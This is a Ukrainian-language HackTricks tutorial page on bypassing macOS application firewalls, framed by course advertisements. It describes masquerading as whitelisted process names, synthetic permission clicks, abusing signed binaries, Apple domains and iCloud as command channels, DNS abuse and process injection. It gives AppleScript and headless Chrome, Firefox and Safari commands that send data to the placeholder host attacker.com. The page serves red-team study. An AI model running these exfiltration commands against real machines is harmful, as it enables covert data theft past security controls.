# Обхід брандмауерів macOS

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа хакінгу HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа хакінгу HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

## Знайдені техніки

Наступні техніки були виявлені як працюючі в деяких додатках брандмауерів macOS.

### Зловживання іменами білого списку

* Наприклад, назви шкідливих програм можуть бути викликані іменами відомих процесів macOS, таких як **`launchd`**

### Синтетичний клік

* Якщо брандмауер запитує дозвіл від користувача, шкідлива програма може **клацнути на дозвіл**

### Використання підписаних бінарних файлів Apple

* Наприклад, **`curl`**, а також інші, такі як **`whois`**

### Відомі домени Apple

Брандмауер може дозволяти підключення до відомих доменів Apple, таких як **`apple.com`** або **`icloud.com`**. І iCloud може бути використаний як C2.

### Загальний обхід

Деякі ідеї для спроб обійти брандмауери

### Перевірка дозволеного трафіку

Знання дозволеного трафіку допоможе вам визначити потенційно включені в білий список домени або додатки, які мають до них доступ.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Зловживання DNS

DNS-розрішення виконується за допомогою підписаної програми **`mdnsreponder`**, яка, ймовірно, буде дозволена звертатися до DNS-серверів.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Через програми браузера

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Сафарі
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Через внедрення процесів

Якщо ви можете **впровадити код в процес**, який має дозвіл на підключення до будь-якого сервера, ви можете обійти захист брандмауера:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Посилання

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
